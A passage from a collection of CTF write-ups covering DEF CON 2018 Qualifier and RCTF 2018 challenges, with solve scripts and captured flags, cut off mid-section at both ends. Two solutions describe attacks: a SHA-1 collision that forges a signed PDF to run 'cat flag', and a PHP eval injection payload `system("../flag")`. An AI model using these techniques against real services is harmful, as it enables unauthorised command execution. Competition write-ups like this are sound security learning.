2 | (5) | 3 |\n| P4 | 8 | 2 | 1 | (1) |\n\nThis is obviously rarely the best permutation, but it is only a starting point for the next step, a greedy algorithm – we swap the assignments of pairs of people whenever the total distance decreases.\n\n| | F1 | F2 | F3 | F4 |\n| --- | --- | --- | --- | --- |\n| P1 | (4) | -2- | 1 | 3 |\n| P2 | -4- | (4) | 1 | 3 |\n| P3 | 1 | 2 | (5) | 3 |\n| P4 | 8 | 2 | 1 | (1) |\n\nIn the above table, swapping P1 and P2 decreases the total distance by 2. After a couple of steps, there are no more beneficial swaps:\n\n| | F1 | F2 | F3 | F4 |\n| --- | --- | --- | --- | --- |\n| P1 | 4 | (2) | 1 | 3 |\n| P2 | 4 | 4 | (1) | 3 |\n| P3 | (1) | 2 | 5 | 3 |\n| P4 | 8 | 2 | 1 | (1) |\n\nFor some time, while working out the solution to this challenge, I thought this solution would always converge to the optimal solution. Fortunately, before this greedy algorithm I first implemented an actual bruteforce checker which simply goes through all the permutations via Heap's algorithm. I say fortunately because this helped me find out that there are situations in which the greedy algorithm will not reach the minimum distance. An example from an actual problem generated by the server:\n\n| | F1 | F2 | F3 | F4 |\n| --- | --- | --- | --- | --- |\n| P1 | 1167 | 1097 | 991  | 1787 |\n| P2 | 1414 | 1489 | 1771 | 1889 |\n| P3 | 1255 | 961  | 1497 | 2001 |\n| P4 | 2054 | 1984 | 1004 | 1800 |\n\nGreedy algorithm solution `[3, 1, 2, 4]`, giving a total distance of `5166`:\n\n| | F1 | F2 | F3 | F4 |\n| --- | --- | --- | --- | --- |\n| P1 | 1167 | 1097 | (991)  | 1787 |\n| P2 | (1414) | 1489 | 1771 | 1889 |\n| P3 | 1255 | (961)  | 1497 | 2001 |\n| P4 | 2054 | 1984 | 1004 | (1800) |\n\nBruteforce solution `[1, 4, 2, 3]`, giving a total distance of `5021`:\n\n| | F1 | F2 | F3 | F4 |\n| --- | --- | --- | --- | --- |\n| P1 | (1167) | 1097 | 991  | 1787 |\n| P2 | 1414 | 1489 | 1771 | (1889) |\n| P3 | 1255 | (961)  | 1497 | 2001 |\n| P4 | 2054 | 1984 | (1004) | 1800 |\n\nSo how come the greedy algorithm could not find this? The swapping algorithm minimises the total distance, but only ever considers what happens when two people's foods are swapped. To reach the optimal solution in this case, it would have to swap people in a cycle of size 3.\n\nThis was bad news. I could expand the greedy algorithm to first consider swaps of two, then of cycles of three, and so on. Unfortunately, this makes it just as bad in time complexity as the bruteforce algorithm!\n\nSo for the actual solution, the greedy swapping algorithm is applied, but only as a single step before a more thorough check. It is relatively quick (`O(n^2)` for `n` people) and it produces a reasonable \"best guess\" value for the minimum distance.\n\nThe next step is to evaluate all permutations! But with a very important optimisation - pruning. The way people are assigned to food can be modeled as a tree of choices, at each level choosing one of the remaining foods to the next person. An example with 3 people:\n\n    P1 -(F1)- P2 -(F2)- P3 -(F3)- [1, 2, 3]\n      |         \\\n      |          \\(F3)- P3 -(F2)- [1, 3, 2]\n      \\         \n      |\\(F2)- P2 -(F1)- P3 -(F3)- [2, 1, 3]\n      |         \\\n      |          \\(F3)- P3 -(F1)- [2, 3, 1]\n      \\         \n       \\(F3)- P2 -(F1)- P3 -(F2)- [3, 1, 2]\n                \\\n                 \\(F2)- P3 -(F1)- [3, 2, 1]\n\nThe bruteforce algorithm explores each leaf of this tree. But this is often unnecessary. As we walk down the tree, we add distances one by one to a running total, so our total distance for a given assignment is the value of this running total when we reach a leaf of the tree. But suppose we have already found a solution with a total distance of 200, when exploring a branch that already has a running total of 250 – clearly we cannot find a better solution in that branch, since the distances are all positive and the running total will only ever increase. This is the principle of pruning. Whenever we actually reach a leaf, we reached it because it is a better solution than the current best, so we can remember this one instead.\n\nSo we set our best minimum to the result of the greedy swapping algorithm and go through the permutations. How else can we speed the process up?\n\nIn the above diagram, the foods are always chosen for each person in the same order (F1, then F2, then F3) if available. Suppose P1 lives in the same city as F3, but is far from all other foods - then F3 is clearly the best assignment for P1, but we first try to give them F1, then F2. If we try to assign foods with shorter distances to people as we are iterating the tree, we improve our chances of finding a better minimum sooner, allowing us to prune away a larger part of the tree. So – we sort each row of the person-food distance table and assign foods in that order at each level.\n\nFinally, there is one more improvement we can make to the pruning. We can remember the minimum of each row in the person-food distance table. At each level of the tree, we can calculate the sum of the row minima of the levels below. Most likely, it would be impossible to reach this mimimum, because it can contain conflicting assignments (i.e. two people assigned to the same food). However, we know we definitely cannot do better than that minimum in the levels below. So, if our running total + the row minima of the levels below exceeds the best known solution, we can stop exploring this branch.\n\n### But … ###\n\nThere is a problem. All of the above works very quickly and solves the queries given by the server in fractions of seconds. But sometimes the server rejects the answer. The best I've seen is 24 / 141 queries answered correctly. I thought the problem might be that people cannot cross other food cities before reaching the meeting point, which may be a food city. This required some annoying changes in the code – i.e. when solving distances from food to cities, do Dijkstra's algorithm, but never go to a food city. Then for each food city, look at all of its neighbours and see if each food can reach at least one.\n\nBut then I got this query from the server:\n\n    9 8 9\n    6\n    2\n    7\n    8\n    5\n    3\n    0\n    1\n    4\n    5\n    6\n    2\n    1\n    4\n    7\n    8\n    0\n    3\n    0 6 817\n    0 7 417\n    1 2 118\n    2 8 687\n    2 3 412\n    2 4 78\n    4 7 595\n    5 8 358\n\nIn this situation, each city has a food in it, as well as a person. Here is a graph representation:\n\n                    1\n                    |\n    6 - 0 - 7 - 4 - 2 - 8 - 5\n                    |\n                    3\n\nClearly there will always be some people who cannot reach the meeting point without crossing other food cities. E.g. if the meeting point is 2, the person from city 6 has to cross cities 0, 7, and 4.\n\nSo, currently I have no idea what could be wrong with my approach. Perhaps I made a mistake in my assumptions, or I'll talk to an admin and find out for sure.\n", "timestamp": "2025-10-24T11:38:52.234268"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-12-DEF-CON-CTF-Qualifier/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-12-DEF-CON-CTF-Qualifier/README.md", "content": "# 2018-05-05-PlaidCTF #\n\n[CTFTime link](https://ctftime.org/event/608) | [Website](https://scoreboard.oooverflow.io/)\n\n---\n\n## Challenges ##\n\n > Note: incomplete challenge listing\n\n### Amuse Bouche ###\n\n - [x] [102 ELF Crumble](#102-elf-crumble)\n - [x] [101 You Already Know](#101-you-already-know)\n - [x] [104 Easy Pisy](#104-easy-pisy)\n\n### Guest Chefs ###\n\n - [x] [104 PHP Eval White-List](#104-php-eval-white-list)\n - [x] [121 ghettohackers: Throwback](#121-ghettohackers-throwback)\n\n---\n\n## 102 ELF Crumble ##\n\n(warmup)\n\n**Files provided**\n\n - `broken`\n - `fragment_1.dat`\n - `fragment_2.dat`\n - `fragment_3.dat`\n - `fragment_4.dat`\n - `fragment_5.dat`\n - `fragment_6.dat`\n - `fragment_7.dat`\n - `fragment_8.dat`\n\n**Description**\n\nWe were given an executable, `broken`, which has a big hole in the middle, filled with X's. The size of the hole is the same as all the fragment sizes added up, so it was quite clear we were meant to assemble the fragments into the binary in the correct order.\n\n**Solution**\n\nCertainly inspecting the fragments would be helpful, checking alignment and instructions. But, since the CTF started at 1am for me and I wanted to sleep before starting for real, the lazy (but computer-time-intensive) solution is to just assemble the binary in every possible way, then run them all. Script:\n\n    #!/bin/bash\n    \n    # `broken` parts before and after the hole\n    dd bs=1 count=1453 if=broken of=broken_pre\n    dd bs=1 skip=2260 if=broken of=broken_post\n    echo \"prefix and postfix created ...\"\n    \n    # permutation function, from https://stackoverflow.com/a/3846321\n    function perm() {\n        local fragments=\"$1\"\n        local order=\"$2\"\n        local i\n        [[ \"$fragments\" == \"\" ]] && echo \"$order\" && return\n        for (( i=0; i<${#fragments}; i++ )); do\n            perm \"${fragments:0:i}${fragments:i+1}\" \"$order${fragments:i:1}\"\n        done\n    }\n    \n    # assemble all permutations into binaries\n    mkdir -p perm\n    fragments=\"12345678\"\n    perm \"$fragments\" | while read order; do\n        ((count++))\n        echo \"$count: $order\"\n        (\n            cat broken_pre\n            for (( i=0; i<${#order}; i++ )); do\n                cat \"fragment_${order:i:1}.dat\"\n            done\n            cat broken_post\n        ) > \"perm/$order\"\n        chmod +x \"perm/$order\"\n    done\n    echo \"binaries generated ...\"\n    \n    # run all binaries in parallel, record output in out\n    mkdir -p out\n    for f in perm/*; do\n        ( (\"$f\" 2>&1 >\"out/\"`basename $f`\".txt\") &)\n    done\n    echo \"binaries executed ...\"\n    \n    # find unique outputs\n    printf \"flag: \"\n    find out -type file -not -empty -exec cat {} \\;\n\nAfter some time, prints out `welcOOOme`.\n\n## 101 You Already Know ##\n\n(warmup)\n\n**No files provided**\n\n**Description**\n\n> You already know the answer here.\n> \n> **Seriously**, *if you can read this*, you already have the flag.\n> \n> Submit it!\n\n(More or less, I don't remember the exact wording.)\n\n**Solution**\n\nAfter trying to paste various pieces of the text into the flag submission box, and being annoyed (because PoW + timeouts), I finally thought about the challenge a bit more. The rules clearly said flags are always in the format `OOO{...}` unless stated otherwise in the description. So after having tried the literal `OOO{...}`, I checked the web inspector.\n\nThe HTML for the description box did not contain anything interesting. However, there was a delay between opening the description box and the text loading - clearly the data was loaded asynchronously via AJAX, which enabled the challenges to be revealed by the organisers whenever without having to reload the website.\n\nSo, recording the network activity, opening the challenge description triggers a request whose response contained `OOO{Sometimes, the answer is just staring you in the face. We have all been there}`. It was marked as a comment so the respone parser would not even put it into the HTML.\n\n## 104 Easy Pisy ##\n\n(crypto, web)\n\n**Files provided**\n\n - `samples.tgz` - an archive containing\n   - `echo-ciao.pdf` - a PDF with the text \"ECHO ciao\"\n   - `echo-ciao.sign` - signature for `echo-ciao.pdf`\n   - `execute-ls.pdf` - a PDF with the text \"EXECUTE ls\"\n   - `execute-ls.sign` - signature for `execute-ls.pdf`\n\n**Description**\n\nThe target website contained two forms - one to upload a PDF file and have the server sign it, and another one to upload a PDF file with a signature and have the server execute it.\n\n**Solution**\n\nAfter some testing and viewing the PHP file sources (via public debug parameter), it was clear that the server is using ImageMagick to `convert` the PDF file into a PPM bitmap, then using `ocram` to read the text visually. The signing was done via `openssl_sign` and `openssl_verify`, using the default SHA algorithm, but then encrypting the signature using RSA. Uploading the given `EXECUTE ls` file with its proper signature revealed that the public and private key are in the same directory, but the access was forbidden. There was also a `flag` file, likewise inaccessible.\n\nI spent way too long trying to figure out something clever for this one. I knew about the SHAttered attack but for some reason I thought it still takes a long time to actually construct two matching files. So, in my fumbling around I learnt a bunch about how PDFs work, and was trying / considering these attack vectors:\n\n - length extension attack - impossible since the signature is encrypted\n - make the PDF file include `flag` via filespec - PDF embedded files can't actually be displayed as content (AFAIK)\n - `openssl_verify` wasn't checked properly, trip it up by sending malformed signature? - no luck\n - OCR exploit - ???\n\nSo, in the end … Simply use [sha1collider](https://github.com/nneonneo/sha1collider). Make a PDF that just shows \"EXECUTE cat flag\", then `python3 collide.py execute-ls.pdf execute-catflag.pdf` and done. At least I learnt something! `OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}`\n\n## 104 PHP Eval White-List ##\n\n(re, web)\n\n**Files provided**\n\n - `eval.so`\n\n**Description**\n\nThe challenge website which lets us run PHP's `eval` with \"patched\" version of `eval`. The shared object file contained the patched function.\n\n**Solution**\n\nSince the website said to try and execute `flag`, before even looking into the shared object, I tried `system(\"../flag\")`. Done: `OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}`\n\n## 121 ghettohackers: Throwback ##\n\n(misc)\n\n**Files provided**\n\n - `text`\n\n**Description**\n\nThe `text` file contained:\n\n> Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!\n\n**Solution**\n\nNaturally my first instinct was to fill in the missing letters. So, filling in the blanks, we get:\n\n> Anyone who would sacrifice policy for execution speed thinks security is a commodity to pour in to a system!\n\nThe letters we filled in were `nwltisoos`. This doesn't really look like anything and it was not the flag. The description and the title of the challenge hinted at DEF CON CTFs from a long time ago. I assume this sort of challenge was indeed part of an old CTF, but I couldn't find it. Searching for the quote itself was not successful either, there was no exact match for this sentence.\n\nIn my text editor the text was laid out like this:\n\n    Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!\n        n w                  l           ti            s               o       o         s   .\n\nSo I focused on the blanks between the filled-in letters. Counting the number of spaces between each blank (and the beginning):\n\n    4-1-18-11-0-12-15-7-9-3\n\nAnd, substituting 1 for A, 2 for B, etc, and 0 for a space, that gives us the flag, `dark logic`.\n", "timestamp": "2025-10-24T11:38:52.706182"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-19-RCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-19-RCTF/README.md", "content": "# 2018-05-19-RCTF #\n\n[CTFTime link](https://ctftime.org/event/624) | [Website](https://rctf2018.xctf.org.cn/)\n\n---\n\n## Challenges ##\n\n### Misc ###\n\n - [x] [206 Number Game](#206-misc--number-game)\n - [x] [52 git](#52-misc--git)\n - [ ] 606 520 gift\n - [x] [256 cats](#256-misc--cats)\n - [x] [377 cats Rev.2](#377-misc--cats-rev2)\n - [x] [73 sign](#73-misc--sign)\n\n### Crypto ###\n\n - [ ] 416 ECDH\n - [x] [176 cpushop](#176-crypto--cpushop)\n\n### Reverse ###\n\n - [x] [540 magic](#540-reverse--magic)\n - [x] [161 babyre](#161-reverse--babyre)\n - [ ] 588 compiler\n - [x] [317 simple vm](#317-reverse--simple-vm)\n - [x] [606 simple re](#606-reverse--simple-re)\n - [x] [338 sql](#338-reverse--sql)\n - [x] [444 babyre2](#444-reverse--babyre2)\n\n### Web ###\n\n - [ ] 769 no-js\n - [ ] 606 backdoor\n - [ ] 487 amp\n - [ ] 869 retter\n - [x] [500 r-cursive](#500-web--r-cursive)\n - [ ] 769 rBlog 2018 Rev.2\n - [ ] 434 rBlog 2018\n\n### Pwn ###\n\n - [ ] 317 babyheap\n - [ ] 540 stringer\n - [ ] 465 rnote4\n - [ ] 384 rnote3\n - [ ] 454 simulator\n\n---\n\n## 206 Misc / Number Game ##\n\n**Description**\n\n> Guess Guess Guess\n> \n> nc 149.28.139.172 10002\n\n**Solution**\n\nUpon connecting, we get a standard PoW prompt:\n\n    sha256(****+UJBS55MXKhMOcSQO) == 4e3cefcf649092ef546aaabfcfa628e63377ce08bf17012f628ac48fbba2307d\n    Give me XXXX:\n\n([simple PoW solver](scripts/pow.py))\n\nAfter solving the PoW:\n\n      o__ __o             o__ __o    ____o__ __o____   o__ __o__/_ \n     <|     v\\           /v     v\\    /   \\   /   \\   <|    v      \n     / \\     <\\         />       <\\        \\o/        < >          \n     \\o/     o/       o/                    |          |           \n      |__  _<|       <|                    < >         o__/_       \n      |       \\       \\                    |          |           \n     <o>       \\o       \\         /         o         <o>          \n      |         v\\       o       o         <|          |           \n     / \\         <\\      <\\__ __/>         / \\        / \\          \n    In every round of the game, I'll choose some different numbers from the figure interval. You are required to guess those numbers,ofc so does the order of them.\n    On each surmise of yours, 2 numbers will be told as a hint for you, but you need to speculate the fuctions of these 2 figures. (XD\n    GLHF\n    ================== round 1 ================== \n    Give me 4 numbers, in[0, 10), You can only try 6 times\n\nSome string format vulns and overflows were tried, but no luck, we actually have to solve the game properly. Providing 4 numbers returns e.g.:\n\n    Nope. 1, 0\n\nShould be familiar, it's the [Mastermind game](https://en.wikipedia.org/wiki/Mastermind_(board_game)), apparently also known as \"cows and bulls\". In each round, there is a hidden sequence of four numbers, 0 through 9. We get 6 attempts to guess the correct sequence. With each incorrect attempt, we get two pieces of feedback:\n\n - \"blacks\" - how many of our numbers are in the hidden sequence AND in the same position\n - \"whites\" - how many of our numbers are in the hidden sequence but NOT in the same position\n\nSo I ~~stole~~ adapted a Mastermind solver from [here](https://github.com/Michael0x2a/mastermind-solver/blob/master/python/solve_mastermind.py) (thanks @Michael0x2a!). The principle is simple:\n\n 1. generate a pool of all possible guesses, for 10 different numbers and a sequence of 4 numbers, there are 10000 possible sequences\n 2. pick a guess and get feedback for it\n 3. if incorrect, eliminate all guesses from the pool that are inconsistent with the feedback and go back to step 2\n\nThe first guess is always `[0, 0, 1, 1]` for the 10 number 4-sequence (as it turns out all rounds are actually like this). There is an additional heuristic in picking a good guess, namely, a guess which may reduce the pool to the fewest remaining sequences.\n\nI added socket interaction and the PoW solver to make it automated. After letting it run for a bit, I was disappointed to see that it rarely got past 4 rounds, and at this point I found out on the IRC that there are 8 rounds before you get the flag.\n\nMostly hopeless, I looked at the correct solutions it got to the few rounds it managed. Interestingly enough, among all the correct solutions, there was never a sequence with duplicate numbers! So, I removed these sequences from the initial pool and made the initial guess to always be `[0, 1, 2, 3]`.\n\n([full script here](scripts/number-game-solver.py))\n\nWith this modification the results were immediately better and in just a couple of attempts the flag was obtained!\n\n`RCTF{0lD_GaM3_nAmed_Bu11s_4nd_C0ws}`\n\n## 52 Misc / git ##\n\n**Description**\n\n> My file lost! \n> \n> attachment: https://drive.google.com/open?id=1Mo3uN2FV1J-lbqjQZvvXitWagZqjD1Xi \n\n**Solution**\n\nThe attachment is a zip archive with this directory structure:\n\n    git/\n        .git/\n            ...\n        HelloWorld.txt\n\nThere is no stash nor commits in the log, and the `develop` branch seems to be the same. But, using `git reflog`:\n\n    22d3349 HEAD@{0}: checkout: moving from develop to master\n    22d3349 HEAD@{1}: rebase -i (finish): returning to refs/heads/develop\n    22d3349 HEAD@{2}: rebase -i (start): checkout 22d3349\n    f671986 HEAD@{3}: checkout: moving from master to develop\n    22d3349 HEAD@{4}: checkout: moving from develop to master\n    f671986 HEAD@{5}: checkout: moving from master to develop\n    22d3349 HEAD@{6}: checkout: moving from rctf to master\n    f671986 HEAD@{7}: commit: Revert\n    f4d0f6d HEAD@{8}: commit: Flag\n    22d3349 HEAD@{9}: checkout: moving from master to rctf\n    22d3349 HEAD@{10}: commit (initial): Initial Commit\n\nWe see there was a `Flag` commit that was reverted. So we can `git checkout f4d0f6d` which reveals the `flag.txt` file.\n\n`RCTF{gIt_BranCh_aNd_l0g}`\n\n## 256 Misc / cats ##\n\n**Description**\n\n> I love cats! PS: This is NOT a web challenge. Just find the cats.\n> \n> http://cats.2018.teamrois.cn:1337\n\n**Solution**\n\nAt the address we see:\n\n![](screens/cats.png)\n\nAnd the linked dockerfile:\n\n    FROM ubuntu:latest\n    ENV TZ=Asia/Shanghai\n    RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n    RUN apt-get update && apt-get install -y php python3 nodejs ruby && mkdir /app\n    WORKDIR /app\n    \n    # build: docker build -t rctf_cats .\n    # judge: docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c \"timeout 5 diff -Z <(cat food) <(eachCatNameYouProvided food)\"\n\nSo, without bothering to actually set up Docker, we see that it runs the command `timeout 5 diff -Z <(cat food) <(eachCatNameYouProvided food)`. Whatever we put into the textarea will be the contents of the file `food`. Then the command compares the output of `cat food`, i.e. the contents we provided, with 15 commands we provide in the second input invoked with the argument `food`.\n\nSome other details – `cat` doesn't count as a cat (too obvious I guess!), and thanks to the regex we cannot provide any commandline arguments, just the names of commands that we want to run. Finally, the content of the file has to be at least 2 bytes, but no more than 1337 bytes, so an empty file is unfortunately not possible.\n\nThe solution was obtained by using a basic Ubuntu VM. In the shell I typed `a`, then presed tab twice to get a listing of commands that start with `a`, then looked for anything that might work. Same for every other letter.\n\nThe most important thing to realise for this part of the challenge was probably that we need to have 15 commands that will output the same thing as `cat food` *in this particular* setup. We don't actually need to find 15 commands that do the same thing as `cat` (why would they even exist then?).\n\nSo, the commands I provided fall into two categories:\n\n - ones which treat the argument `food` as a path or filename (e.g. `ls`)\n - ones which treat the argument `food` as a string (e.g. `echo`)\n\nThinking of `echo food` and `cat food`, I decided the best choice for the contents of the `food` file was the literal string `food`. Then `cat food` simply outputs `food`. Useful.\n\nAnd so finally, the list of commands I chose:\n\n - `ls` - normally lists directories, but given a path to a file it simply outputs its name (this is more useful when combined with other arguments)\n - `dir` - basically the same as `ls` as far as I can tell\n - `more` - normally provides an interactive terminal viewer for file contents, but when piped into a command like `diff` it behaves just like `cat`\n - `php` - by default, PHP copies file contents to stdout, unless it finds the tag `<?php` (or `<?`)\n - `uniq` - filters out non-unique consecutive lines of a file; with a single line there is nothing to filter and it just prints it to output\n - `sort` - sorts the lines of a file; nothing to sort with a single line\n - `head` - shows the first N (10 by default) lines of a file\n - `tail` - shows the last N (10 by default) lines of a file\n - `find` - finds files by name, without a pattern just looks for a file called `food` and outputs its name\n - `echo` - prints out its argument to stdout\n - `fold` - prints out contents of a file, wrapping long lines\n - `expr` - evaluate expressions in arguments; `food` is just a string, so it is printed as-is\n - `paste` - print out files side-by-side, with a single file argument it is just `cat`\n - `fmt` - formats file contents according to arguments \n - `basename` - given a path, print out only its last part\n\nAnd with that:\n\n> Wew, you've found 15 cats! Here is your flag: RCTF{you_love_cats_dont_you}. If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.\n\n## 377 Misc / cats Rev.2 ##\n\n**Description**\n\n> solve cats first \n> \n> http://cats.2018.teamrois.cn:1337\n\n**Solution**\n\nUsing the hint from the solution to `cats`, we need another list of 15 commands, but they must include at least 4 of `python3`, `bash`, `php`, `node`, `ruby`.\n\nScript interpreters like these are generally happy to just do nothing when given an empty input file, but our `food` file must be at least 2 bytes in size! This immediately meant one thing: polyglot quine, or polyquine for short.\n\nA \"polyglot\" in a programming context is a piece of code that is valid (and preferably does the same thing) in multiple languages. A lot of simple Python scripts are technically polyglots, since they work in both Python 2 and Python 3. The less similar the syntax of two languages is, the more difficult it is to make a polyglot with them, naturally.\n\nAnd a \"quine\" in a programming context is a program which produces its own source code when executed. Generally, if this is accomplished by actually opening and reading the source file the program is considered a \"cheating quine\", since a lot of the difficulty of this problem is in crafting a string which somehow expands into the full program when formatted in a particular way. Fortunately, there is no restriction in this challenge, and a cheating quine is completely fine.\n\nAt first I looked online for similar challenges, and [this answer](https://codegolf.stackexchange.com/a/163371) seemed the closest to what I needed. Unfortunately, `perl` was not on the list of possible languages, and the challenge asked for Python 3, not Python 2. I spent some time trying to adapt this to work better, but I could only ever make it work for 3 languages at a time.\n\nThen I decided to write my own polyquine, and solve the challenge the hard way. There was no particular method to my development, just writing some code and seeing which interpreter complains about the changes and why, then fixing it and so on. Of the 5 languages I chose `python3`, `bash`, `php`, and `node`, since I knew their syntax well enough. `ruby` not so much.\n\nThe script I came up with during the CTF was:\n\n    a=0;food=1;exit=0;cat=2;echo=3;x=5;int=6\n    cat <food\n    echo\n    exit <food\n    int; 1//5 # <?php die(substr(file_get_contents(\"food\"),79).\"\\n\"); ?>\n    int; 2//5 or __import__(\"sys\").stdout.write(open(\"food\").read() + \"\\n\") and quit() and \"\"\"\n    x ;console.log(require(\"fs\").readFileSync(\"food\", \"utf8\"));\n    x//\"\"\"\n\nI made no effort to clean it up (mostly a waste of time if it works), but for this write-up I will describe a smaller version. The core functionality is the same.\n\n    a=0;cat=0;echo=0;exit=0;food=0;i=0\n    cat<food\n    echo;exit\n    i//1#<?die(substr(file_get_contents(\"food\"),59).\"\\n\");?>\n    i//2;print(open(\"food\").read());quit();\"\"\"\n    x =0;console.log(require(\"fs\").readFileSync(\"food\",\"utf8\"))\n    x//\"\"\"\n\nSome things could still be removed, but I kept them to make sure `sort` prints the file out as-is, i.e. the lines need to be sorted already. Let's see how each language interprets this code.\n\n### PHP ###\n\nPHP is the simplest to understand. By default, PHP just copies file contents to standard output. Any actual scripting capability is possible only in PHP mode, which is entered when a `<?php` tag is encountered, or the short version `<?`. So PHP first prints out everything from `a=0;cat= ...` all the way until `i//1#`. Then it executes this code:\n\n    die(substr(file_get_contents(\"food\"),59).\"\\n\");\n\n`file_get_contents(\"food\")` returns the entire `food` file contents as a string. `substr(..., 59)` removes the first 59 characters (to account for the first part of the file that has already been printed). A `\"\\n\"` newline is added for consistency with `cat` and the other interpreters. `die(...)` outputs the string to stdout and stops execution.\n\n### Bash ###\n\n`a=0` is a variable assignment in Bash. Multiple statements can be combined into one line by joining them with a `;` semicolon. `cat<food` redirects the file `food` into `cat`, which then outputs it. `echo` puts an extra newline and `exit` stops execution. After `exit`, the lines no longer have to make sense to Bash, since it interprets the file line by line.\n\n### Javascript (NodeJS) ###\n\nJS is unhappy about statements using variables that haven't been declared yet, e.g. `a + b` can throw an error if either `a` or `b` are not variables. Usually, variables are declared as `var a = \"value\";`, i.e. using the `var` keyword (or `let` or `const` in more modern JS). However, an assignment without the `var` keyboard is still valid, but it creates a global variable (in the global `window` object). So the first line is just creating a bunch of variables. Statements in JS can be terminated with a semicolon, but the semicolon can usually be omitted at the end of the line. This hurts my eyes but here it is convenient for a smaller file.\n\n`cat<food` is a less-than comparison to JS. `echo` and `exit` use the previously declared variables, but the statements don't actually do anything. \n\nThe `i//1...` and `i//2...` lines are also just using the `i` variable. Everything after `//` is ignored as a comment. Same for the last line `x//\"\"\"`.\n\nSo the most important statement is `console.log(require(\"fs\").readFileSync(\"food\",\"utf8\"));`, which requires / imports the `fs` API from NodeJS standard libary, then calls its `readFileSync` function, which synchronously reads the file `food` and decodes it as a UTF-8 string. Finally, `console.log(...)` outputs this string to stdout (along with a trailing newline).\n\n### Python 3 ###\n\nThe first three lines are interpreted similarly to JS. Some variables are declared and values are assigned to them, then some no-op expressions are evaluated.\n\nBut, `i//1` in Python means integer division of `i` by `1`. The rest of line 4 is ignored, because `#` starts a line comment.\n\n`print(open(\"food\").read())` does the actual source code output (and a trailing newline). `quit()` then stops execution. Finally `\"\"\"` starts a multiline string, which carries on till the end of the file, so the last two lines are not considered code and hence don't have to make sense to Python.\n\n### 11 other cats ###\n\nAnd with that, I fulfilled the requirement of using 4 out of the 5 specified languages. I considered adding `ruby`, but again, I don't know much about its syntax so I made due with what I had. The 11 other commands I used were:\n\n - `sh`, `dash`, `rbash` - other Bash-like shells which have some differences but interpret this script the same way\n - `head`, `tail`, `uniq`, `more`, `paste` - same as in `cats`\n - `zmore` - views compressed files directly on terminal, but also shows uncompressed files verbatim\n - `sort` - this is why I made sure the lines of code are sorted already\n - `python3m` - equivalent to `python3 --with-pymalloc` which does not affect Python's functionality.\n\nAnd with that:\n\n> Wew, you've found 15 cats! Here is your flag: RCTF{you_love_cats_dont_you}. You are so lihai! RCTF{did_you_make_a_polyglot}\n\nI did indeed.\n\n## 73 Misc / sign ##\n\n**Description**\n\n> Run it and get flag (but how?) (segfault is NOT a bug)\n> \n> attachment: https://drive.google.com/open?id=1ghFVktqDYM48YiJt-ppx6a-2JHH-wIKm\n\n**Solution**\n\nApparently the simplest challenge of the CTF, the executable seems to contain the wine runtime and some emulated Windows functions, dialogs, Notepad stuff ...? Perhaps it runs properly on a Linux desktop with a graphical environment / X11?\n\nFor my actual solution however, I loaded the executable into radare and after analysing the functions with `aaa`, `afl` produced:\n\n    0x7f7f96534000    8 192  -> 194  obj.imp.__wine_main_argv\n    0x7f7f96545cd0    1 6            sym.imp.__wine_dll_register\n    0x7f7f96545ce0    1 6            sym.imp.__stack_chk_fail\n    0x7f7f96545cf0   21 270  -> 256  entry0\n    0x7f7f96545e00    3 33           sub._ITM_deregisterTMCloneTable_e00\n    0x7f7f96545e70    4 50           entry2.fini\n    0x7f7f96545eb0    5 5    -> 56   entry1.init\n    0x7f7f96545ec8    1 6            fcn.7f7f96545ec8\n    ...\n    0x7f7f96546238    1 6            fcn.7f7f96546238\n    0x7f7f96546481    5 256          sym.ShowLastError\n    0x7f7f96546581    6 295          sym.UpdateWindowCaption\n    0x7f7f965466a8    8 359          sym.DIALOG_StringMsgBox\n    0x7f7f96546a32    3 129          sym.FileExists\n    0x7f7f96547074   14 208          sym.DoCloseFile\n    0x7f7f965471fa   47 1579         sym.DoOpenFile\n    0x7f7f96547825    3 121          sym.DIALOG_FileNew\n    ...\n    0x7f7f96549e44    1 65           sym.DIALOG_FilePageSetup\n    0x7f7f9654a192    1 124          sym.SetFileNameAndEncoding\n    0x7f7f9654a20e    9 195          sym.get_dpi\n    0x7f7f9654bb68   17 684          sym.NOTEPAD_DoFind\n    0x7f7f9654ce46   18 1356         sym.WinMain\n    0x7f7f9654fff8    1 8            reloc.__cxa_finalize\n\nOf interest was really mainly `sym.WinMain`, so with `pdf @ sym.WinMain`, I found a line that said:\n\n    ...\n    |      |    0x7f7f9654d263      488b4018       mov rax, qword [rax + 0x18] ; [0x18:8]=-1 ; 24\n    |      |    0x7f7f9654d267      488d159a0800.  lea rdx, str.RCTF_WelCOme_To_RCTF ; 0x7f7f9654db08 ; u\"RCTF{WelCOme_To_RCTF}\\n\\n\\u5700\\u6168\\u3f74\\u5920\\u756f\\u6420\\u6365\\u6d6f\\u6970\\u656c\\u2064\\u656d\\u3f3f\"\n    |      |    0x7f7f9654d26e      4889c1         mov rcx, rax\n    ...\n\nAnd there was the flag:\n\n`RCTF{WelCOme_To_RCTF}`\n\nIn fact, the flag was available in plaintext in the binary, but e.g. `strings` could not find it - it was encoded as UTF-16, taking two bytes per character. This is typical for Windows binaries, which is probably why this challenge used this setup.\n\n## 176 Crypto / cpushop ##\n\n**Description**\n\n> attachment: https://drive.google.com/open?id=11lK6aKJZEq6QhrD6L7SSew4KhvXz_cz0\n> \n> nc cpushop.2018.teamrois.cn 43000\n\n**Solution**\n\nAfter playing a bit with the menus, we see that the script lets us see a list of items we can purchase:\n\n    1. List Items\n    2. Order\n    3. Pay\n    4. Exit\n    Command: 1\n     0 - Intel Core i9-7900X           $999\n     1 - Intel Core i7-7820X           $599\n     2 - Intel Core i7-7700K           $349\n     3 - Intel Core i5-7600K           $249\n     4 - Intel Core i3-7350K           $179\n     5 - AMD Ryzen Threadripper 1950X  $999\n     6 - AMD Ryzen 7 1800X       